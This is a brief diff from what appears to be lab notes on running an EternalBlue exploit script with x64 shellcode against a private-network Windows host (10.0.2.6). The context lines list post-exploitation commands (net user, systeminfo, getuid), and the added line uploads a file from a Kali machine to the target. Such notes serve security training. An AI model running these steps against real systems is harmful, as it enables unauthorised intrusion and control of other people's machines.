@@ -54,5 +54,5 @@ python eternalblue_exploit7.py 10.0.2.6 shellcode/sc_x64.bin
     net user
     systeminfo
     getuid
-
+    upload /home/kali/file.txt C:\to the desired file location on win\
 Done!
